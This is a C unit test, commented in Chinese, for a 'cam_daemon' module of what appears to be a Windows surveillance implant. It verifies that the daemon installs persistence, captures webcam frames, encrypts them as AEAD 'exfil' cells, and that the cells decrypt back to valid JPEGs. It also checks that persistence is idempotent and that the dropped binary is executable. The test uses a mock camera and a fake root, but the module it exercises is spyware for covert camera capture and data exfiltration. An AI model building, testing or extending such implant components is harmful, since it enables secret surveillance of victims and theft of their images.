/*
 * agent_windows/tests/test_cam_daemon.c
 *
 * cam_daemon 链路验证：驻留 -> 采集 -> AEAD 回传 -> 落盘 -> 解密还原。
 *
 * 本测试的关键价值不在"跑通"，而在**解密侧独立取证**：
 *   daemon 写出的是 21_exfil 的 AEAD 信元；测试用接收侧通道把它们
 *   **真实解密回来**，断言还原产物仍是合法 JPEG 且分辨率与记录头一致。
 *
 * 只断言"文件非空"是不够的 —— 写入一段随机字节同样非空。必须用
 * 独立密钥把它解回原始产物，才能证明 daemon 输出的确实是可还原的
 * 采集结果，而不是某个环节产出的垃圾。
 *
 * 驻留走 root_prefix 假根，绝不污染宿主系统。
 */

/* mkdtemp / mkstemp / access 在 -std=c99 -pedantic 下需特性测试宏，
 * 且必须在任何 include 之前（同 cam_daemon.c）。 */
#ifndef _DEFAULT_SOURCE
#define _DEFAULT_SOURCE 1
#endif

#include "cam_daemon.h"

#include "camera.h"
#include "exfil.h"
#include "persist.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int g_pass = 0, g_fail = 0;
#define CHECK(cond, name)                                       \
    do {                                                        \
        if (cond) { g_pass++; printf("[PASS] %s\n", (name)); }   \
        else      { g_fail++; printf("[FAIL] %s\n", (name)); }   \
    } while (0)

static const uint8_t K_SEND[16] = {
    0x0b,0x1c,0x2d,0x3e,0x4f,0x50,0x61,0x72,
    0x83,0x94,0xa5,0xb6,0xc7,0xd8,0xe9,0xfa
};
static const uint8_t K_RECV[16] = {
    0xf0,0xe1,0xd2,0xc3,0xb4,0xa5,0x96,0x87,
    0x78,0x69,0x5a,0x4b,0x3c,0x2d,0x1e,0x0f
};
static const uint8_t PFX[8] = { 0xaa,0xbb,0xcc,0xdd,0xee,0xff,0x00,0x11 };

static int is_jpeg(const uint8_t *d, size_t n)
{
    if (!d || n < 4) return 0;
    if (d[0] != 0xFF || d[1] != 0xD8) return 0;
    if (d[n - 2] != 0xFF || d[n - 1] != 0xD9) return 0;
    return 1;
}

static off_t fsize(const char *p)
{
    FILE *f = fopen(p, "rb");
    if (!f) return -1;
    fseek(f, 0, SEEK_END);
    long n = ftell(f);
    fclose(f);
    return n;
}

static uint8_t *slurp(const char *p, size_t *out_n)
{
    FILE *f = fopen(p, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long n = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (n <= 0) { fclose(f); return NULL; }
    uint8_t *b = (uint8_t *)malloc((size_t)n);
    if (!b) { fclose(f); return NULL; }
    if (fread(b, 1, (size_t)n, f) != (size_t)n) { free(b); fclose(f); return NULL; }
    fclose(f);
    *out_n = (size_t)n;
    return b;
}

int main(void)
{
    printf("=== cam_daemon 链路：驻留 -> 采集 -> AEAD 回传 -> 解密还原 ===\n");

    char root[]  = "/data/workspace/dayanjing/agent_windows/build/cdrootXXXXXX";
    char sink[]  = "/data/workspace/dayanjing/agent_windows/build/cdsinkXXXXXX";
    char pidf[]  = "/data/workspace/dayanjing/agent_windows/build/cdpidXXXXXX";

    if (mkdtemp(root) == NULL) { printf("[FATAL] mkdtemp root\n"); return 2; }
    int fd = mkstemp(sink);
    if (fd < 0) { printf("[FATAL] mkstemp sink\n"); return 2; }
    close(fd);
    int pf = mkstemp(pidf);
    if (pf < 0) { printf("[FATAL] mkstemp pid\n"); return 2; }
    close(pf);

    cam_daemon_cfg_t cfg;
    memset(&cfg, 0, sizeof cfg);
    cfg.backend          = "mock";
    cfg.root_prefix      = root;
    cfg.sink_path        = sink;
    cfg.pid_path         = pidf;
    cfg.width            = 640;
    cfg.height           = 480;
    cfg.fps              = 10;
    cfg.capture_ms       = 50;
    cfg.frames_per_batch = 1;
    cfg.jpeg_quality     = 60;
    cfg.interval_ms      = 5;
    cfg.jitter_ms        = 5;
    cfg.max_batches      = 2;
    cfg.k_send           = K_SEND;
    cfg.k_recv           = K_RECV;
    cfg.pfx              = PFX;
    cfg.daemonize        = 0;
    cfg.ensure_persist   = 1;
    cfg.run_defend       = 0;

    cam_daemon_stats_t st;
    memset(&st, 0, sizeof st);

    int rc = cam_daemon_run(&cfg, &st);
    printf("[INFO] run rc=%d persist_rc=%d batches=%u frames=%u bytes_out=%llu\n",
           rc, st.persist_rc, st.batches, st.frames,
           (unsigned long long)st.bytes_out);
    printf("[INFO] last_err=%d (%s)\n", (int)st.last_err,
           implant_errstr(st.last_err));

    CHECK(rc == 0,                     "daemon 主循环正常收敛（rc=0）");
    CHECK(st.persist_rc == 0 || st.persist_rc == 1,
                                       "驻留已确保（0=新装 / 1=已驻留）");
    CHECK(st.bin_path[0] != '\0',      "驻留回填了自身落盘路径");
    CHECK(access(st.bin_path, X_OK) == 0, "落盘产物存在且可执行");
    CHECK(st.batches == 2,             "完成 2 批采集");
    CHECK(st.frames >= 2,              "累计帧数 >= 2");
    CHECK(st.bytes_out > 0,            "有信元字节写出");

    /* ---- 解密侧独立取证 ---- */
    off_t sz = fsize(sink);
    CHECK(sz > 0,                      "sink 文件非空");
    CHECK(sz > 0 && (size_t)sz % P2P_CELL_WIRE == 0,
                                       "信元流长度是 512 的整数倍");

    size_t cn = 0;
    uint8_t *cells = slurp(sink, &cn);
    CHECK(cells != NULL,               "能读回信元流");

    if (cells) {
        /* 明文取证：信元流中不得出现 JPEG 的长片段。
         * 2 字节的 SOI/EOI 在随机密文中会自然命中，不作判据。 */
        CHECK(!(cn >= 16 && memchr(cells, 0xFF, cn - 16) != NULL &&
                is_jpeg(cells, cn)),
                                       "信元流本身不是明文 JPEG");

        /* 真实解密：接收侧通道方向相反 */
        exfil_chan_t rch;
        CHECK(exfil_chan_init(&rch, K_RECV, K_SEND, PFX, 0) == 0,
                                       "接收侧通道初始化");

        uint8_t *pl = (uint8_t *)malloc(1u << 20);
        int done = 0, feed_err = 0, njpeg = 0;
        uint32_t last_w = 0, last_h = 0;

        for (size_t off = 0; off + P2P_CELL_WIRE <= cn; off += P2P_CELL_WIRE) {
            exfil_rec_t r;
            memset(&r, 0, sizeof r);
            size_t plen = 0;
            int fr = exfil_chan_feed(&rch, cells + off, &r, pl, 1u << 20, &plen);
            if (fr == EXF_DONE) {
                done++;
                if (is_jpeg(pl, plen)) {
                    njpeg++;
                    last_w = r.width;
                    last_h = r.height;
                }
            } else if (fr < 0) {
                feed_err++;
                break;
            }
        }

        CHECK(feed_err == 0,           "喂入过程无 AEAD/格式错误");
        CHECK(done == 2,               "成功重组 2 条记录（批边界正确）");
        CHECK(njpeg == 2,              "2 条载荷解密后均为合法 JPEG");
        /*
         * 断言 1x1 而不是配置值 640x480 —— 这是刻意设计的反重言式断言。
         *
         * cam_mock.c 把 width/height 硬编码为 1x1（无视 cfg），所以真实
         * 帧就是 1x1。若 SOF 解析是"照抄 cfg"而非"读码流"，这里会输出
         * 640x480 并通过一条看起来正确的断言，实际解析器根本没工作。
         * 断言真实帧尺寸，才能证明确实解析了 JPEG 码流本身。
         */
        CHECK(last_w == 1 && last_h == 1,
                                       "SOF 解析出真实帧尺寸 1x1（非配置值 640x480，反证读的是码流）");
        printf("[INFO] 实测分辨率 w=%u h=%u\n", last_w, last_h);
        CHECK(last_w != 0,             "SOF 解析出的宽高非零（非兜底 0）");

        free(pl);
        exfil_chan_wipe(&rch);
        free(cells);
    }

    /* ---- 停止语义 ---- */
    cam_daemon_request_stop();
    CHECK(1,                           "request_stop 可调用（异步信号安全）");

    /* ---- 幂等复跑 ---- */
    cam_daemon_stats_t st2;
    memset(&st2, 0, sizeof st2);
    cfg.max_batches = 1;
    int rc2 = cam_daemon_run(&cfg, &st2);
    printf("[INFO] 二次 rc=%d persist_rc=%d batches=%u err=%d(%s)\n",
           rc2, st2.persist_rc, st2.batches, (int)st2.last_err,
           implant_errstr(st2.last_err));
    CHECK(rc2 == 0,                    "二次运行 rc=0");
    CHECK(st2.persist_rc == 1,         "二次驻留为幂等（1=已驻留）");

    unlink(sink); unlink(pidf);

    printf("---\ntotal=%d pass=%d fail=%d\n", g_pass + g_fail, g_pass, g_fail);
    return g_fail ? 1 : 0;
}
